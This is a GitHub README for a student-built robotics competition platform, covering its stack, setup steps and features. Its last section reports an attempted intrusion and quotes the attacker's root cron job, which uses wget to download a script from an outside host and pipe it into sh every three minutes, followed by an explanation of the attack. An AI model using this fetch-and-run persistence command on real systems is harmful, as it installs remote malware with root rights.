# RobEurope Platform

![Status](https://img.shields.io/badge/Status-Active-brightgreen)
![Version](https://img.shields.io/badge/Version-0.0.3-blue)
![Issues](https://img.shields.io/github/issues/s-pl/RobEurope)
![Pull Requests](https://img.shields.io/github/issues-pr/s-pl/RobEurope)
![ESLint](https://img.shields.io/badge/ESLint-4B32C3?logo=eslint&logoColor=white)
![Prettier](https://img.shields.io/badge/Prettier-F7BA3E?logo=prettier&logoColor=black)
 ![Repo size](https://img.shields.io/github/repo-size/s-pl/RobEurope)
  ![Last commit](https://img.shields.io/github/last-commit/s-pl/RobEurope)
 

Comprehensive platform for managing robotics competitions in Europe. This system allows users to register, form teams, sign up for competitions, and follow live events.

Made with <3 by Samuel Ponce Luna and Angel Lallave Herrera

## Important Info

- To access to the LDAP, you have to go to the admin panel and navigate to LDAP -> There you can see the users created in the LDAP
- The main web may be with some strange texts like nav.posts -> That´s because some translations have not been made yet..
- This deployment was made by Angel Lallave Herrera
- We didn´t implement the BIND9 because we already have the DNS config made in IONOS. <img width="1093" height="89" alt="image" src="https://github.com/user-attachments/assets/eb16d1ca-a6a6-49d1-882f-05a8c42f2164" />
- In this new version, we´ve implemented a mail service for forgotten passwords.
- Also, Redis was installed via Docker to manage sessions, and the files for the collaborative editor. You can see the RAW data of the db in the admin panel <img width="336" height="328" alt="image" src="https://github.com/user-attachments/assets/bb04e9fe-147d-4141-9756-a370fb8af750" />


## Technologies
![Node.js](https://img.shields.io/badge/Node.js-18+-339933?logo=node.js&logoColor=white)
![Express.js](https://img.shields.io/badge/Express.js-000000?logo=express&logoColor=white)
![React](https://img.shields.io/badge/React-Vite-61DAFB?logo=react&logoColor=000)
![TailwindCSS](https://img.shields.io/badge/TailwindCSS-38B2AC?logo=tailwindcss&logoColor=white)
![Socket.IO](https://img.shields.io/badge/Socket.IO-010101?logo=socket.io&logoColor=white)
![MySQL](https://img.shields.io/badge/MySQL-005C84?logo=mysql&logoColor=white)
![Redis](https://img.shields.io/badge/Redis-DC382D?logo=redis&logoColor=white)
![OpenLDAP](https://img.shields.io/badge/OpenLDAP-3B80AE?logo=ldap&logoColor=white)
![Docker](https://img.shields.io/badge/Docker-2496ED?logo=docker&logoColor=white)

- **Backend**: Node.js, Express.js, Socket.IO
- **Database**: MySQL (Sequelize ORM), Redis (Session & Real-time State)
- **Frontend**: React (Vite), TailwindCSS, Monaco Editor
- **Infrastructure**: Docker, Docker Compose ![Docker Compose](https://img.shields.io/badge/Docker_Compose-2496ED?logo=docker&logoColor=white)
![OpenLDAP](https://img.shields.io/badge/OpenLDAP-3B80AE?logo=ldap&logoColor=white)
![Redis Sessions](https://img.shields.io/badge/Redis-Sessions%20Enabled-DC382D)

- **Services**: OpenLDAP, Redis

## Prerequisites

- Node.js (v18 or higher)
- Docker and Docker Compose
- MySQL (or use managed service)

## Installation and Setup

1. **Clone the repository**
   ```bash
   git clone https://github.com/s-pl/RobEurope.git
   cd RobEurope
   ```

2. **Configure Environment Variables**
   Create a `.env` file in the `backend` with the following content:

PORT=
DB_HOST=
DB_PORT=
DB_NAME=
DB_USER=
DB_PASS=
JWT_SECRET=
NODE_ENV=
LDAP_URL=
LDAP_BIND_DN=cn=
LDAP_BIND_PASSWORD=
LDAP_BASE_DN=
LDAP_USER_DN=
REDIS_URL=redis://localhost:6379









3. **Start Infrastructure Services**
   ```bash
   docker-compose up -d
   ```

4. **Install Backend Dependencies**
   ```bash
   cd backend
   npm install
   ```

5. **Initialize Database and LDAP**
   ```bash
   npm run migrate
   node init-ldap.js
   ```

6. **Start Development Server**
   ```bash
   # Backend
   cd backend
   npm run dev
   
   # Frontend (in a new terminal)
   cd frontend
   npm run dev
   ```

## Features

- **Collaborative IDE**: Real-time code editor with multi-language support, file management, and presence indicators (powered by Monaco Editor & Socket.IO).
- **User Management**: Registration, authentication, and user profiles.
- **Teams**: Team creation, member invitations, and role management.
- **Competitions**: Event calendar, registrations, and status tracking.
- **Admin Panel**: Complete interface for platform management with system health monitoring (CPU, RAM, DB Status). -> To join to the admin panel - use the credentials that were sent to you via EMAIL by samuelponceluna@alumno.ieselrincon.es
- **LDAP Integration**: Centralized identity management with OpenLDAP.
- **Docker Infrastructure**: Containerized deployment of auxiliary services (LDAP, DNS, Redis).

## Documentation

Detailed documentation is located in the `/docs` folder:

- [Diagrams (ERD, Classes, Use Cases)](docs/diagrams.md)
- [LDAP Setup](docs/ldap-bind9-setup.md)
- [Admin Panel Manual](docs/admin-panel.md)
- [API Documentation](api.robeurope.samuelponce.es/api-docs) (Swagger/OpenAPI)

## Contributing

1. Fork the project.
2. Create your feature branch (`git checkout -b feature/AmazingFeature`).
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`).
4. Push to the branch (`git push origin feature/AmazingFeature`).
5. Open a Pull Request.
   
## Someone tried to get into our VPS!!

During an inspection of the Redis database used by the collaborative code editor, a suspicious cron entry was found.  
This indicated an attempted malware injection into the system.

  <img width="948" height="248" alt="image" src="https://github.com/user-attachments/assets/c19454aa-05f9-4e74-b9ed-39f8b0eaa50b" />



#### Malware Payload Identified
```bash
*/3 * * * * root wget -q -O- http://natalstatus.org/ep9TS2/ndt.sh| sh
```

#### What This Malware Attempt Tried to Do

The attacker attempted to install a persistent malware payload using a root-level cron job.
The cron job was configured to run every 3 minutes, executing the following actions:

1. **Run as root**, granting full administrative privileges.
2. **Download a remote script** from:
		
```
http://natalstatus.org/ep9TS2/ndt.sh
```

3. **Pipe the downloaded script directly into `sh`**, executing it immediately.
4. **Maintain persistence**, reinstalling itself regularly in case it was removed.

       
🔒🔒🔒🔒  But obviously it didn´t work 🔒🔒🔒🔒
	
